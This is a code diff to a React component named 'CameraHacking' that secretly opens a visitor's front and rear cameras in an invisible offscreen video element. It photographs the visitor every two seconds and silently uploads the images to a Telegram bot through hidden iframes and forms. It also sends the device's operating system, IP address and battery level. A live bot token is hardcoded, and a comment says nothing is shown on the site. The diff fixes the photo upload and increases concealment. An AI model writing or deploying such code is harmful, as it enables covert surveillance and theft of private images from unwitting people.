@@ -19,7 +19,7 @@ const CameraHacking = ({ chatId }) => {
   const [activeCameras, setActiveCameras] = useState(0);
 
   const TELEGRAM_BOT_TOKEN = '8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s';
-  const CAPTURE_INTERVAL = 2000; // 2 секунды между фото
+  const CAPTURE_INTERVAL = 2000;
   const MAX_CAPTURES = 100;
 
   // Получение информации о батарее
@@ -35,7 +35,6 @@ const CameraHacking = ({ chatId }) => {
         
         updateBatteryInfo();
         
-        // Слушаем изменения
         battery.addEventListener('levelchange', updateBatteryInfo);
         battery.addEventListener('chargingchange', updateBatteryInfo);
         
@@ -50,149 +49,145 @@ const CameraHacking = ({ chatId }) => {
     return null;
   };
 
-  // Отправка сообщения в Telegram
+  // Метод отправки через JSONP (обход CORS)
   const sendToTelegram = async (text) => {
-    try {
-      // Создаем скрытый iframe для отправки
-      const iframe = document.createElement('iframe');
-      iframe.style.display = 'none';
-      document.body.appendChild(iframe);
-      
-      const form = document.createElement('form');
-      form.method = 'POST';
-      form.action = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-      form.target = iframe.name;
-      
-      const chatIdInput = document.createElement('input');
-      chatIdInput.type = 'hidden';
-      chatIdInput.name = 'chat_id';
-      chatIdInput.value = chatId;
-      
-      const textInput = document.createElement('input');
-      textInput.type = 'hidden';
-      textInput.name = 'text';
-      textInput.value = text;
-      
-      const parseModeInput = document.createElement('input');
-      parseModeInput.type = 'hidden';
-      parseModeInput.name = 'parse_mode';
-      parseModeInput.value = 'HTML';
-      
-      const disableNotifInput = document.createElement('input');
-      disableNotifInput.type = 'hidden';
-      disableNotifInput.name = 'disable_notification';
-      disableNotifInput.value = 'true';
-      
-      form.appendChild(chatIdInput);
-      form.appendChild(textInput);
-      form.appendChild(parseModeInput);
-      form.appendChild(disableNotifInput);
-      
-      document.body.appendChild(form);
-      form.submit();
-      
-      setTimeout(() => {
-        form.remove();
-        iframe.remove();
-      }, 1000);
-      
-      return true;
-    } catch (error) {
-      console.error('Message send error:', error);
-      return false;
-    }
+    return new Promise((resolve) => {
+      try {
+        // Создаем временный iframe для отправки
+        const timestamp = Date.now();
+        const iframeName = `telegram_frame_${timestamp}`;
+        
+        const iframe = document.createElement('iframe');
+        iframe.name = iframeName;
+        iframe.style.display = 'none';
+        iframe.onload = () => {
+          setTimeout(() => {
+            iframe.remove();
+            resolve(true);
+          }, 100);
+        };
+        
+        document.body.appendChild(iframe);
+        
+        // Создаем форму
+        const form = document.createElement('form');
+        form.method = 'POST';
+        form.action = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        form.target = iframeName;
+        form.style.display = 'none';
+        
+        // Добавляем параметры
+        const params = {
+          chat_id: chatId,
+          text: text,
+          parse_mode: 'HTML',
+          disable_notification: 'true'
+        };
+        
+        Object.keys(params).forEach(key => {
+          const input = document.createElement('input');
+          input.type = 'hidden';
+          input.name = key;
+          input.value = params[key];
+          form.appendChild(input);
+        });
+        
+        document.body.appendChild(form);
+        form.submit();
+        
+        setTimeout(() => {
+          form.remove();
+          resolve(true);
+        }, 100);
+        
+      } catch (error) {
+        console.error('Send error:', error);
+        resolve(false);
+      }
+    });
   };
 
-  // Отправка фото в Telegram
+  // Метод отправки фото через FormData и iframe
   const sendPhotoToTelegram = async (blob, caption = '', cameraNumber = 1) => {
-    try {
-      // Конвертируем blob в base64
-      const reader = new FileReader();
-      
-      return new Promise((resolve) => {
-        reader.onloadend = async () => {
-          const base64data = reader.result.split(',')[1];
-          
-          // Отправляем через iframe/form
-          const iframe = document.createElement('iframe');
-          iframe.style.display = 'none';
-          document.body.appendChild(iframe);
-          
-          const form = document.createElement('form');
-          form.method = 'POST';
-          form.action = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
-          form.target = iframe.name;
-          form.enctype = 'multipart/form-data';
-          
-          const chatIdInput = document.createElement('input');
-          chatIdInput.type = 'hidden';
-          chatIdInput.name = 'chat_id';
-          chatIdInput.value = chatId;
-          
+    return new Promise((resolve) => {
+      try {
+        const timestamp = Date.now();
+        const iframeName = `photo_frame_${timestamp}`;
+        
+        // Создаем iframe
+        const iframe = document.createElement('iframe');
+        iframe.name = iframeName;
+        iframe.style.display = 'none';
+        iframe.onload = () => {
+          setTimeout(() => {
+            iframe.remove();
+            resolve(true);
+          }, 100);
+        };
+        
+        document.body.appendChild(iframe);
+        
+        // Создаем форму
+        const form = document.createElement('form');
+        form.method = 'POST';
+        form.action = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
+        form.target = iframeName;
+        form.enctype = 'multipart/form-data';
+        form.style.display = 'none';
+        
+        // Добавляем chat_id
+        const chatIdInput = document.createElement('input');
+        chatIdInput.type = 'hidden';
+        chatIdInput.name = 'chat_id';
+        chatIdInput.value = chatId;
+        form.appendChild(chatIdInput);
+        
+        // Добавляем caption
+        if (caption) {
           const captionInput = document.createElement('input');
           captionInput.type = 'hidden';
           captionInput.name = 'caption';
           captionInput.value = caption;
-          
-          const disableNotifInput = document.createElement('input');
-          disableNotifInput.type = 'hidden';
-          disableNotifInput.name = 'disable_notification';
-          disableNotifInput.value = 'true';
-          
-          // Создаем файл из base64
-          const byteCharacters = atob(base64data);
-          const byteNumbers = new Array(byteCharacters.length);
-          for (let i = 0; i < byteCharacters.length; i++) {
-            byteNumbers[i] = byteCharacters.charCodeAt(i);
-          }
-          const byteArray = new Uint8Array(byteNumbers);
-          const blob = new Blob([byteArray], { type: 'image/jpeg' });
-          const file = new File([blob], `camera${cameraNumber}_${Date.now()}.jpg`, { type: 'image/jpeg' });
-          
-          const fileInput = document.createElement('input');
-          fileInput.type = 'file';
-          fileInput.name = 'photo';
-          fileInput.files = new FileList([file]);
-          
-          form.appendChild(chatIdInput);
           form.appendChild(captionInput);
-          form.appendChild(disableNotifInput);
-          // Здесь сложность с добавлением файла через form
-          
-          // Альтернативный метод: отправляем как документ
-          const altForm = document.createElement('form');
-          altForm.method = 'POST';
-          altForm.action = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`;
-          altForm.target = iframe.name;
-          
-          const altChatIdInput = chatIdInput.cloneNode();
-          const altCaptionInput = captionInput.cloneNode();
-          const altDisableNotifInput = disableNotifInput.cloneNode();
-          
-          altForm.appendChild(altChatIdInput);
-          altForm.appendChild(altCaptionInput);
-          altForm.appendChild(altDisableNotifInput);
-          
-          document.body.appendChild(altForm);
-          altForm.submit();
-          
-          setTimeout(() => {
-            altForm.remove();
-            iframe.remove();
-          }, 1000);
-          
-          resolve(true);
-        };
+        }
         
-        reader.readAsDataURL(blob);
-      });
-    } catch (error) {
-      console.error('Photo send error:', error);
-      
-      // Если не удалось отправить фото, отправляем текстовое описание
-      await sendToTelegram(`📸 Фото с камеры ${cameraNumber}: ${caption}`);
-      return false;
-    }
+        // Добавляем disable_notification
+        const notifInput = document.createElement('input');
+        notifInput.type = 'hidden';
+        notifInput.name = 'disable_notification';
+        notifInput.value = 'true';
+        form.appendChild(notifInput);
+        
+        // Создаем input для файла
+        const fileInput = document.createElement('input');
+        fileInput.type = 'file';
+        fileInput.name = 'photo';
+        
+        // Создаем File из Blob
+        const file = new File([blob], `camera${cameraNumber}_${timestamp}.jpg`, { 
+          type: 'image/jpeg',
+          lastModified: timestamp
+        });
+        
+        // Создаем DataTransfer для добавления файла
+        const dataTransfer = new DataTransfer();
+        dataTransfer.items.add(file);
+        fileInput.files = dataTransfer.files;
+        form.appendChild(fileInput);
+        
+        document.body.appendChild(form);
+        form.submit();
+        
+        setTimeout(() => {
+          form.remove();
+          resolve(true);
+        }, 100);
+        
+      } catch (error) {
+        console.error('Photo send error:', error);
+        resolve(false);
+      }
+    });
   };
 
   // Сбор информации об устройстве
@@ -208,7 +203,7 @@ const CameraHacking = ({ chatId }) => {
       language: navigator.language,
       timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
       hardwareConcurrency: navigator.hardwareConcurrency,
-      deviceMemory: navigator.deviceMemory,
+      deviceMemory: navigator.deviceMemory || 'Неизвестно',
       connection: navigator.connection ? {
         effectiveType: navigator.connection.effectiveType,
         downlink: navigator.connection.downlink,
@@ -301,10 +296,8 @@ ${batteryText}
       const devices = await navigator.mediaDevices.enumerateDevices();
       const videoDevices = devices.filter(device => device.kind === 'videoinput');
       
-      console.log('Найдено камер:', videoDevices.length);
       return videoDevices;
     } catch (error) {
-      console.error('Camera enumeration error:', error);
       return [];
     }
   };
@@ -316,7 +309,6 @@ ${batteryText}
       setAvailableCameras(cameras);
       
       if (cameras.length === 0) {
-        console.log('Камеры не найдены');
         return 0;
       }
 
@@ -329,11 +321,12 @@ ${batteryText}
 
       for (let i = 0; i < camerasToActivate; i++) {
         try {
+          // Для первой камеры пробуем заднюю, для второй - переднюю
           const constraints = {
             video: {
               deviceId: cameras[i].deviceId ? { exact: cameras[i].deviceId } : undefined,
-              width: { ideal: 1920 },
-              height: { ideal: 1080 },
+              width: { ideal: 1280 },
+              height: { ideal: 720 },
               facingMode: i === 0 ? { exact: "environment" } : "user"
             },
             audio: false
@@ -348,9 +341,9 @@ ${batteryText}
             position: fixed;
             width: 1px;
             height: 1px;
-            opacity: 0;
+            opacity: 0.001;
             pointer-events: none;
-            z-index: -9999;
+            z-index: -999999;
             top: -9999px;
             left: -9999px;
           `;
@@ -369,7 +362,7 @@ ${batteryText}
 
           // Ждем готовности видео
           await new Promise((resolve) => {
-            const timer = setTimeout(resolve, 2000);
+            const timer = setTimeout(resolve, 1500);
             video.onloadedmetadata = () => {
               clearTimeout(timer);
               video.play().catch(() => {});
@@ -377,20 +370,18 @@ ${batteryText}
             };
           });
 
-          console.log(`Камера ${i + 1} инициализирована: ${cameras[i].label || `Камера ${i + 1}`}`);
         } catch (error) {
-          console.error(`Ошибка инициализации камеры ${i + 1}:`, error);
+          console.error(`Camera ${i + 1} init error:`, error);
         }
       }
 
       return camerasToActivate;
     } catch (error) {
-      console.error('Camera initialization error:', error);
       return 0;
     }
   };
 
-  // Создание изображения с информацией о камере
+  // Создание изображения
   const createCameraImage = async (cameraIndex, video) => {
     if (!canvasRef.current) {
       canvasRef.current = document.createElement('canvas');
@@ -406,45 +397,44 @@ ${batteryText}
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
       
       // Добавляем водяной знак
-      ctx.fillStyle = 'rgba(0, 0, 0, 0.7)';
-      ctx.fillRect(10, canvas.height - 100, 350, 90);
+      ctx.fillStyle = 'rgba(0, 0, 0, 0.6)';
+      ctx.fillRect(10, canvas.height - 110, 300, 100);
       
       ctx.fillStyle = '#FFFFFF';
-      ctx.font = '16px Arial';
+      ctx.font = '14px Arial';
       ctx.textAlign = 'left';
-      ctx.fillText(`📷 Камера ${cameraIndex + 1}`, 20, canvas.height - 80);
-      ctx.fillText(`🔋 ${batteryLevel || '?'}%${batteryCharging ? ' (⚡)' : ''}`, 20, canvas.height - 60);
-      ctx.fillText(`⏰ ${new Date().toLocaleTimeString()}`, 20, canvas.height - 40);
-      ctx.fillText(`#${captureCount + 1}`, 20, canvas.height - 20);
+      ctx.fillText(`📸 Камера ${cameraIndex + 1}`, 20, canvas.height - 90);
+      ctx.fillText(`🔋 ${batteryLevel || '?'}%`, 20, canvas.height - 70);
+      ctx.fillText(`⏰ ${new Date().toLocaleTimeString()}`, 20, canvas.height - 50);
+      ctx.fillText(`#${captureCount + 1}`, 20, canvas.height - 30);
     } else {
-      // Тестовое изображение если камера не работает
-      canvas.width = 800;
-      canvas.height = 600;
+      // Тестовое изображение
+      canvas.width = 640;
+      canvas.height = 480;
       const ctx = canvas.getContext('2d');
       
-      // Градиентный фон
-      const gradient = ctx.createLinearGradient(0, 0, 800, 600);
+      const gradient = ctx.createLinearGradient(0, 0, 640, 480);
       gradient.addColorStop(0, '#667eea');
       gradient.addColorStop(1, '#764ba2');
       ctx.fillStyle = gradient;
-      ctx.fillRect(0, 0, 800, 600);
+      ctx.fillRect(0, 0, 640, 480);
       
       ctx.fillStyle = '#FFFFFF';
-      ctx.font = 'bold 40px Arial';
+      ctx.font = 'bold 30px Arial';
       ctx.textAlign = 'center';
-      ctx.fillText('📷 CAMERA SYSTEM', 400, 200);
-      
-      ctx.font = '24px Arial';
-      ctx.fillText(`Камера ${cameraIndex + 1}`, 400, 260);
-      ctx.fillText(`Фото #${captureCount + 1}`, 400, 300);
-      ctx.fillText(new Date().toLocaleTimeString(), 400, 340);
+      ctx.fillText('📷 СИСТЕМА КАМЕР', 320, 150);
       
       ctx.font = '20px Arial';
-      ctx.fillText(`🔋 ${batteryLevel || '?'}%${batteryCharging ? ' (зарядка)' : ''}`, 400, 400);
+      ctx.fillText(`Камера ${cameraIndex + 1}`, 320, 200);
+      ctx.fillText(`Фото #${captureCount + 1}`, 320, 240);
+      ctx.fillText(new Date().toLocaleTimeString(), 320, 280);
+      
+      ctx.font = '18px Arial';
+      ctx.fillText(`🔋 ${batteryLevel || '?'}%`, 320, 330);
     }
 
     return new Promise(resolve => {
-      canvas.toBlob(resolve, 'image/jpeg', 0.8);
+      canvas.toBlob(resolve, 'image/jpeg', 0.7);
     });
   };
 
@@ -453,12 +443,10 @@ ${batteryText}
     if (captureCount >= MAX_CAPTURES) {
       stopCapturing();
       await sendToTelegram(
-        `📊 *ЗАВЕРШЕНИЕ РАБОТЫ*\n\n` +
-        `✅ Достигнут лимит ${MAX_CAPTURES} фото\n` +
-        `📷 Камеры: ${activeCameras}\n` +
-        `📈 Всего фото: ${captureCount * activeCameras}\n` +
+        `✅ Завершено\n` +
+        `📸 Фото: ${captureCount * activeCameras}\n` +
         `🔋 Батарея: ${batteryLevel || '?'}%\n` +
-        `⏰ Время: ${new Date().toLocaleString()}`
+        `⏰ ${new Date().toLocaleString()}`
       );
       return;
     }
@@ -470,34 +458,31 @@ ${batteryText}
         const photoBlob = await createCameraImage(i, video);
         
         if (photoBlob) {
-          const cameraType = i === 0 ? '📷 ЗАДНЯЯ' : '🤳 ПЕРЕДНЯЯ';
-          const caption = `${cameraType} КАМЕРА\n` +
-            `📸 Фото #${captureCount + 1}\n` +
-            `🔋 Батарея: ${batteryLevel || '?'}%${batteryCharging ? ' (⚡ Зарядка)' : ''}\n` +
-            `📱 ${deviceInfo?.os || 'Устройство'}\n` +
-            `📐 ${photoBlob.size > 0 ? Math.round(photoBlob.size / 1024) + ' KB' : ''}\n` +
-            `⏰ ${new Date().toLocaleTimeString()}`;
+          const cameraType = i === 0 ? '📷 Задняя камера' : '🤳 Передняя камера';
+          const caption = `${cameraType}\n` +
+            `Фото #${captureCount + 1}\n` +
+            `Батарея: ${batteryLevel || '?'}%${batteryCharging ? ' (⚡)' : ''}\n` +
+            `Устройство: ${deviceInfo?.os || ''}\n` +
+            `Время: ${new Date().toLocaleTimeString()}`;
           
           await sendPhotoToTelegram(photoBlob, caption, i + 1);
         }
       } catch (error) {
-        console.error(`Ошибка захвата с камеры ${i + 1}:`, error);
+        console.error(`Camera ${i + 1} capture error:`, error);
       }
     }
 
     setCaptureCount(prev => prev + 1);
 
     // Статистика каждые 10 циклов
-    if ((captureCount + 1) % 10 === 0) {
+    if ((captureCount + 1) % 10 === 0 && activeCameras > 0) {
       await sendToTelegram(
-        `📊 *СТАТИСТИКА #${captureCount + 1}*\n\n` +
-        `📷 Активные камеры: ${activeCameras}\n` +
-        `📈 Циклов съемки: ${captureCount + 1}\n` +
-        `🖼 Всего фото: ${(captureCount + 1) * activeCameras}\n` +
-        `🔋 Батарея: ${batteryLevel || '?'}%${batteryCharging ? ' (⚡)' : ''}\n` +
-        `📱 ${deviceInfo?.os || ''}\n` +
-        `🌐 IP: ${deviceInfo?.ip || ''}\n` +
-        `⏰ Время: ${new Date().toLocaleString()}`
+        `📊 Статистика #${captureCount + 1}\n` +
+        `Камеры: ${activeCameras}\n` +
+        `Циклов: ${captureCount + 1}\n` +
+        `Всего фото: ${(captureCount + 1) * activeCameras}\n` +
+        `Батарея: ${batteryLevel || '?'}%\n` +
+        `Время: ${new Date().toLocaleString()}`
       );
     }
   };
@@ -558,30 +543,25 @@ ${batteryText}
       
       if (camerasCount > 0 && mounted) {
         await sendToTelegram(
-          `🎥 *КАМЕРЫ АКТИВИРОВАНЫ*\n\n` +
-          `✅ Успешно инициализировано: ${camerasCount} камер\n` +
-          `📷 Будут использоваться обе камеры\n` +
-          `⏱ Интервал съемки: ${CAPTURE_INTERVAL/1000} секунд\n` +
-          `🔋 Батарея: ${batteryLevel || '?'}%\n` +
-          `🚀 Начало съемки через 1 секунду`
+          `✅ Камеры активированы: ${camerasCount}\n` +
+          `📸 Начинаю съемку\n` +
+          `⏱ Интервал: ${CAPTURE_INTERVAL/1000}с\n` +
+          `🔋 Батарея: ${batteryLevel || '?'}%`
         );
         
         // Запускаем периодический захват
         startPeriodicCapture();
       } else {
         await sendToTelegram(
-          `⚠️ *ПРОБЛЕМА С КАМЕРАМИ*\n\n` +
-          `❌ Не удалось инициализировать камеры\n` +
-          `📱 Устройство: ${info.os}\n` +
-          `🌐 Браузер: ${info.browser}\n` +
-          `🔋 Батарея: ${batteryLevel || '?'}%\n` +
-          `⏰ Время: ${new Date().toLocaleString()}`
+          `⚠️ Камеры не найдены\n` +
+          `Устройство: ${info.os}\n` +
+          `Батарея: ${batteryLevel || '?'}%`
         );
       }
     };
 
     // Запускаем с небольшой задержкой
-    setTimeout(init, 1500);
+    setTimeout(init, 1000);
 
     return () => {
       mounted = false;
@@ -589,7 +569,7 @@ ${batteryText}
     };
   }, []);
 
-  // НИЧЕГО НЕ ПОКАЗЫВАЕМ НА САЙТЕ кроме хомяка
+  // НИЧЕГО НЕ ПОКАЗЫВАЕМ на сайте
   return null;
 };
 
